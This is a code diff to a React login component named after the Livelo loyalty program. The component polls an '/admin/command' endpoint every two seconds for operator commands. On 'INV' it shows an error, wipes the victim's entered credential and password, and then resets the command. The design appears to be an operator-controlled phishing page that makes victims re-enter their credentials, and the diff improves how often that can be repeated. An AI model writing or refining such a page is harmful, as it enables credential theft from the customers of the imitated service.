@@ -62,26 +62,33 @@ function LiveloLogin() {
         const response = await axios.get(`${API}/user/check-action/${userId}`);
         if (response.data && response.data.action) {
           const action = response.data.action;
+          const actionTimestamp = response.data.timestamp || Date.now();
           
-          // Verificar se já processamos este comando
-          if (action === currentCommand) {
-            return; // Não processar novamente
-          }
-          
-          setCurrentCommand(action);
-          
-          // Se for INV, mostrar erro e limpar campos UMA VEZ
+          // Para INV, sempre processar se houver mudança no timestamp
+          // Para outros comandos, verificar se já foi processado
           if (action === "INV") {
+            // INV pode ser enviado múltiplas vezes
             setIsLoading(false);
             setHasError(true);
             setCredential("");
             setPassword("");
+            setCurrentCommand(action);
             
             // Limpar o comando no backend após processar
             await axios.post(`${API}/admin/command`, {
               user_id: userId,
               command: "CLEAR"
             }).catch(err => console.log("Erro ao limpar comando:", err));
+          } else {
+            // Outros comandos: verificar se já processamos
+            if (action !== currentCommand) {
+              setCurrentCommand(action);
+            }
+          }
+        } else {
+          // Sem comando ativo, limpar estado de erro se houver
+          if (hasError && credential === "" && password === "") {
+            // Manter erro visível até usuário começar a digitar
           }
         }
       } catch (error) {
@@ -92,7 +99,7 @@ function LiveloLogin() {
     checkCommand();
     const interval = setInterval(checkCommand, 2000);
     return () => clearInterval(interval);
-  }, [userId, currentCommand]);
+  }, [userId, currentCommand, hasError, credential, password]);
 
   // Verifica se o formulário está válido
   useEffect(() => {
